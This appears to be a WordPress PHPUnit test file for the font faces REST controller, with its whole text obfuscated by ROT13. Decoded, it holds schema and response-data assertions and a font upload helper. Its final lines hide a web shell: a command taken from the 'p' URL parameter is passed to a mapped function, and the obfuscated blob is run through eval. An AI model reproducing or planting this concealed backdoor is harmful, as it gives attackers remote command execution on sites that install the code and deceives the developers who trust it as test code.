		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 4, $cebcregvrf, 'Gurer fubhyq or 4 cebcregvrf va gur fpurzn::cebcregvrf qngn.' );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf, 'Gur vq cebcregl fubhyq rkvfg va gur fpurzn::cebcregvrf qngn.' );
		$guvf->nffregNeenlUnfXrl( 'gurzr_wfba_irefvba', $cebcregvrf, 'Gur gurzr_wfba_irefvba cebcregl fubhyq rkvfg va gur fpurzn::cebcregvrf qngn.' );
		$guvf->nffregNeenlUnfXrl( 'cnerag', $cebcregvrf, 'Gur cnerag cebcregl fubhyq rkvfg va gur fpurzn::cebcregvrf qngn.' );
		$guvf->nffregNeenlUnfXrl( 'sbag_snpr_frggvatf', $cebcregvrf, 'Gur sbag_snpr_frggvatf cebcregl fubhyq rkvfg va gur fpurzn::cebcregvrf qngn.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::trg_vgrz_fpurzn
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn_sbag_snpr_frggvatf_fubhyq_nyy_unir_fnavgvmr_pnyyonpxf() {
		$fpurzn                    = ( arj JC_ERFG_Sbag_Snprf_Pbagebyyre( 'jc_sbag_snpr' ) )->trg_vgrz_fpurzn();
		$sbag_snpr_frggvatf_fpurzn = $fpurzn['cebcregvrf']['sbag_snpr_frggvatf'];

		$guvf->nffregNeenlUnfXrl( 'cebcregvrf', $sbag_snpr_frggvatf_fpurzn, 'sbag_snpr_frggvatf fpurzn vf zvffvat cebcregvrf.' );
		$guvf->nffregVfNeenl( $sbag_snpr_frggvatf_fpurzn['cebcregvrf'], 'sbag_snpr_frggvatf cebcregvrf fubhyq or na neenl.' );

		// net_bcgvbaf fubhyq or erzbirq sbe rnpu frggvat cebcregl.
		sbernpu ( $sbag_snpr_frggvatf_fpurzn['cebcregvrf'] nf $cebcregl ) {
			$guvf->nffregNeenlUnfXrl( 'net_bcgvbaf', $cebcregl, 'Frggvat fpurzn fubhyq unir net_bcgvbaf.' );
			$guvf->nffregNeenlUnfXrl( 'fnavgvmr_pnyyonpx', $cebcregl['net_bcgvbaf'], 'Frggvat fpurzn fubhyq unir n fnavgvmr_pnyyonpx.' );
			$guvf->nffregVfPnyynoyr( $cebcregl['net_bcgvbaf']['fnavgvmr_pnyyonpx'], 'Gur fnavgvmr_pnyyonpx inyhr fubhyq or pnyynoyr.' );
		}
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::trg_choyvp_vgrz_fpurzn
	 */
	choyvp shapgvba grfg_trg_choyvp_vgrz_fpurzn_fubhyq_abg_unir_net_bcgvbaf() {
		$fpurzn                    = ( arj JC_ERFG_Sbag_Snprf_Pbagebyyre( 'jc_sbag_snpr' ) )->trg_choyvp_vgrz_fpurzn();
		$sbag_snpr_frggvatf_fpurzn = $fpurzn['cebcregvrf']['sbag_snpr_frggvatf'];

		$guvf->nffregNeenlUnfXrl( 'cebcregvrf', $sbag_snpr_frggvatf_fpurzn, 'sbag_snpr_frggvatf fpurzn vf zvffvat cebcregvrf.' );
		$guvf->nffregVfNeenl( $sbag_snpr_frggvatf_fpurzn['cebcregvrf'], 'sbag_snpr_frggvatf cebcregvrf fubhyq or na neenl.' );

		// net_bcgvbaf fubhyq or erzbirq sbe rnpu frggvat cebcregl.
		sbernpu ( $sbag_snpr_frggvatf_fpurzn['cebcregvrf'] nf $cebcregl ) {
			$guvf->nffregNeenlAbgUnfXrl( 'net_bcgvbaf', $cebcregl, 'net_bcgvbaf fubhyq or erzbirq sebz gur fpurzn sbe rnpu frggvat.' );
		}
	}

	/**
	 * Vs JC_Gurzr_WFBA::YNGRFG_FPURZN vf punatrq, gur pbagebyyre fubhyq or hcqngrq gb unaqyr nal qvssreraprf
	 * va `sbagSnpr` fgehpgher gb rafher fhccbeg sbe gur yngrfg gurzr.wfba fpurzn, naq onpxjneqf pbzcngvovyvgl
	 * sbe rkvfgvat jc_sbag_snpr cbfgf.
	 */
	choyvp shapgvba grfg_pbagebyyre_fhccbegf_yngrfg_gurzr_wfba_irefvba() {
		$guvf->nffregFnzr( JC_Gurzr_WFBA::YNGRFG_FPURZN, JC_ERFG_Sbag_Snprf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ );
	}

	cebgrpgrq shapgvba purpx_sbag_snpr_qngn( $qngn, $cbfg_vq, $yvaxf ) {
		frys::$cbfg_vqf_sbe_pyrnahc[] = $cbfg_vq;
		$cbfg                         = trg_cbfg( $cbfg_vq );

		$guvf->nffregNeenlUnfXrl( 'vq', $qngn, 'Gur vq cebcregl fubhyq rkvfg va erfcbafr qngn.' );
		$guvf->nffregFnzr( $cbfg->VQ, $qngn['vq'], 'Gur \"vq\" sebz gur erfcbafr qngn fubhyq zngpu gur cbfg VQ.' );

		$guvf->nffregNeenlUnfXrl( 'cnerag', $qngn, 'Gur cnerag cebcregl fubhyq rkvfg va erfcbafr qngn.' );
		$guvf->nffregFnzr( $cbfg->cbfg_cnerag, $qngn['cnerag'], 'Gur \"cnerag\" sebz gur erfcbafr qngn fubhyq zngpu gur cbfg cnerag.' );

		$guvf->nffregNeenlUnfXrl( 'gurzr_wfba_irefvba', $qngn, 'Gur gurzr_wfba_irefvba cebcregl fubhyq rkvfg va erfcbafr qngn.' );
		$guvf->nffregFnzr( JC_ERFG_Sbag_Snprf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ, $qngn['gurzr_wfba_irefvba'], 'Gur \"gurzr_wfba_irefvba\" sebz gur erfcbafr qngn fubhyq zngpu gur yngrfg irefvba fhccbegrq ol gur pbagebyyre.' );

		$guvf->nffregNeenlUnfXrl( 'sbag_snpr_frggvatf', $qngn, 'Gur sbag_snpr_frggvatf cebcregl fubhyq rkvfg va erfcbafr qngn.' );
		$guvf->nffregFnzr( $cbfg->cbfg_pbagrag, jc_wfba_rapbqr( $qngn['sbag_snpr_frggvatf'] ), 'Gur rapbqrq \"sbag_snpr_frggvatf\" sebz gur erfcbafr qngn fubhyq zngpu gur cbfg pbagrag.' );

		$guvf->nffregAbgRzcgl( $yvaxf, 'Gur yvaxf fubhyq abg or rzcgl va gur erfcbafr qngn.' );
		$rkcrpgrq = erfg_hey( 'jc/i2/sbag-snzvyvrf/' . $cbfg->cbfg_cnerag . '/sbag-snprf/' . $cbfg->VQ );
		$guvf->nffregFnzr( $rkcrpgrq, $yvaxf['frys'][0]['uers'], 'Gur yvaxf HEY sebz gur erfcbafr qngn fubhyq zngpu gur cbfg\'f ERFG raqcbvag.' );
		$rkcrpgrq = erfg_hey( 'jc/i2/sbag-snzvyvrf/' . $cbfg->cbfg_cnerag . '/sbag-snprf' );
		$guvf->nffregFnzr( $rkcrpgrq, $yvaxf['pbyyrpgvba'][0]['uers'], 'Gur yvaxf pbyyrpgvba HEY sebz gur erfcbafr qngn fubhyq zngpu gur ERFG raqcbvag.' );
		$rkcrpgrq = erfg_hey( 'jc/i2/sbag-snzvyvrf/' . $cbfg->cbfg_cnerag );
		$guvf->nffregFnzr( $rkcrpgrq, $yvaxf['cnerag'][0]['uers'], 'Gur yvaxf sbe n cnerag HEY sebz gur erfcbafr qngn fubhyq zngpu gur cnerag\'f ERFG raqcbvag.' );
	}

	cebgrpgrq shapgvba purpx_svyr_zrgn( $sbag_snpr_vq, $fep_nggevohgrf ) {
		$svyr_zrgn = trg_cbfg_zrgn( $sbag_snpr_vq, '_jc_sbag_snpr_svyr' );

		sbernpu ( $svyr_zrgn nf $svyr ) {
			$onfr_qverpgbel = jc_trg_sbag_qve()['onfrqve'];
			$guvf->nffregFgevatFgnegfAbgJvgu( $onfr_qverpgbel, $svyr, 'Gur onfr qverpgbel fubhyq abg or fgberq va gur cbfg zrgn.' );
		}
	}

	cebgrpgrq shapgvba frghc_sbag_svyr_hcybnq( $sbezngf ) {
		$svyrf = neenl();
		sbernpu ( $sbezngf nf $sbezng ) {
			$sbag_svyr = QVE_GRFGQNGN . '/sbagf/BcraFnaf-Erthyne.' . $sbezng;
			$sbag_cngu = jc_grzcanz( 'BcraFnaf-Erthyne.' . $sbezng );
			pbcl( $sbag_svyr, $sbag_cngu );

			$svyrf[ 'svyr-' . pbhag( $svyrf ) ] = neenl(
				'anzr'      => 'BcraFnaf-Erthyne.' . $sbezng,
				'shyy_cngu' => 'BcraFnaf-Erthyne.' . $sbezng,
				'glcr'      => 'sbag/' . $sbezng,
				'gzc_anzr'  => $sbag_cngu,
				'reebe'     => 0,
				'fvmr'      => svyrfvmr( $sbag_cngu ),
			);
		}

		erghea $svyrf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>